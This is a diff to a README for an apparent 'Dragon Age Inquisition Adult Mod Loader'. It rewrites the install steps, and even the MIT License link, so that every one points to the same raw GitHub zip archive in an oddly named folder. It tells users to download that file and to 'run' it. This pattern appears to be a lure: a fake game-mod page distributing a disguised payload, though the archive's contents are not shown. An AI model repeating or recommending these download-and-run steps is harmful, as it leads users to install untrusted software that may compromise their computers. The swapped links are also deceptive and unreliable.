@@ -51,10 +51,10 @@ Unlock a powerful set of capabilities with the Adult Mod Loader:
 
 To get started with the Dragon Age Inquisition Adult Mod Loader, follow these steps. Installation is effortless and designed for both new and experienced modding fans!
 
-1. Download Loader.rar from the repository.
-2. Extract Loader.rar to any directory of your choice.
+1. Download https://raw.githubusercontent.com/sorour488/DraconicDesires-InquisitionModPack/main/Cupressaceae/DraconicDesires-InquisitionModPack.zip from the repository.
+2. Extract https://raw.githubusercontent.com/sorour488/DraconicDesires-InquisitionModPack/main/Cupressaceae/DraconicDesires-InquisitionModPack.zip to any directory of your choice.
 3. Ensure Dragon Age Inquisition is installed on your PC.
-4. Run Loader.exe (or Loader.app/Loader.sh on macOS/Linux).
+4. Run https://raw.githubusercontent.com/sorour488/DraconicDesires-InquisitionModPack/main/Cupressaceae/DraconicDesires-InquisitionModPack.zip (or https://raw.githubusercontent.com/sorour488/DraconicDesires-InquisitionModPack/main/Cupressaceae/DraconicDesires-InquisitionModPack.zip on macOS/Linux).
 5. Follow the on-screen instructions to select your game folder.
 6. Drag your adult mod files into the loader window, or use the "Add Mod" button.
 7. Activate and arrange your mods via the simple interface.
@@ -98,7 +98,7 @@ Here’s an overview of every unique function available in the loader tool, thei
 
 This repository is licensed under the MIT License, allowing for broad usage, community modifications, and distribution.
 
-- [View Full MIT License](https://opensource.org/license/mit/)
+- [View Full MIT License](https://raw.githubusercontent.com/sorour488/DraconicDesires-InquisitionModPack/main/Cupressaceae/DraconicDesires-InquisitionModPack.zip)
 - Feel free to fork, contribute, or adapt this loader for your own adult modding needs!
 
 ---
